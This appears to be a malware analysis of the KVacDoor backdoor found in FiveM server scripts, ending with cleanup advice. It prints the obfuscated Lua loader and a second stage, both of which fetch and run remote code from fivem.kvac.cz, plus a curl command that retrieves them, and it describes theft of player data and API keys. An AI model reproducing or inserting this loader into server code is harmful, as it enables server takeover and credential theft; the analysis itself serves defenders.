As an introduction, KVacDoor is a really used fivem and garry's mod server manager, boasting features such as 

> **Lua Script**
The scripting system allows you or the KVacDoor staff to quickly run lua code on your servers.

> **Smart Lua**
Inject your lua codes discreetly in one click in one of your addons with the Smart Lua tool.

Turns out that it's also a backdoor, which uses this code, injected into the server-side of a fivem-script to plant itself inside the server.
It is strongly recommended you read cipher's panel breakdown as the code and method used are almost identical - https://github.com/ericstolly/cipher/blob/main/chapters/chapter-1-payload.md
```
local Enchanced_Tabs = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}

local random_char = {
    "68", "74", "74", "70", "73", "3a", "2f", "2f", "66", "69", "76", "65", "6d", "2e", "6b", "76",
    "61", "63", "2e", "63", "7a", "2f", "66", "2e", "70", "68", "70", "3f", "6b", "65", "79", "3d",
    "6f", "6a", "6f", "54", "4a", "5a", "57", "65", "50", "52", "6e", "50", "4b", "59", "55", "70", "41", "36", "7a", "34",
}

function str_utf8()
    _empt = ""
    for id,it in pairs(random_char) do
        _empt = _empt..it
    end
    return (_empt:gsub("..", function (cc)
        return string.char(tonumber(cc, 16))
        
    end))
end

Enchanced_Tabs[10](str_utf8(), function (e, d)
    local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
    if (d == nil) then return end
    s()
end)
```
If that looks familiar, that's because it's the same code (with the link changed of course) used by the cipher panel backdoor - 
I'd recommend reading it before continuing one, though I will explain briefly how the code works
In-short the `random_char` table is a link, which gets interpreted by `str_utf8()` which runs as an http request on the server, giving access to it.
Running the code without the last codeblock (which if you look at the `Enchanced_Tabs` table is an http request) in any lua compiler (https://onecompiler.com/lua/42d7ex7dx)
and appending `print(str_utf8)` to it, so we can see what the encoded message is, gives us this link - https://fivem.kvac.cz/f.php?key=ojoTJZWePRnPKYUpA6z4.

If we cURL the link using the "FXServer/PerformHttpRequest" user-agent, we'd get this:
```
PerformHttpRequest("https://fivem.kvac.cz/_/api.php\x3f\x6b\x65\x79\x3d\x33\x52\x6a\x34\x6c\x5a\x65\x79\x76\x57\x4a\x6e\x61\x33\x50\x69\x7a\x71\x4f\x6b", function(a, b) if b == nil or b == "" then return end assert(load(b))() end, "POST")
```

You can verify on linux using this command:
`curl https://fivem.kvac.cz/f.php?key=ojoTJZWePRnPKYUpA6z4 -A "FXServer/PerformHttpRequest"`

As we can see we get more lua code, if we extract the link
`https://fivem.kvac.cz/_/api.php\x3f\x6b\x65\x79\x3d\x33\x52\x6a\x34\x6c\x5a\x65\x79\x76\x57\x4a\x6e\x61\x33\x50\x69\x7a\x71\x4f\x6b`
and translate it to text:
`https://fivem.kvac.cz/_/api.php?key=3Rj4lZeyvWJna3PizqOk`

cURL-ing this link grants us the payload code:

minimized-payload.lua

beautifying it a bit we get this

payload.lua

The scripts seem to grab all relevant info like licenses, IPs, identifiers from the players in your server, and also stealing API keys from the server .cfg
It also overrides the `chatMessage` event
It grants the resource the payload was ran from permissions in the server.cfg - and therefore txAdmin


```Post-Infection Measures```
It is highly recommended to shutdown the server as soon as the backdoor is installed, as by default it doesn't inject itself outside the OS and only in the former 3 locations.
Then reseting any API keys you have put in your server.cfg (like steam, rcon passwords)
Then reinstalling your chat script, deleting the malicious code from your resource and remove the command access granted in the last lines of the server.cfg.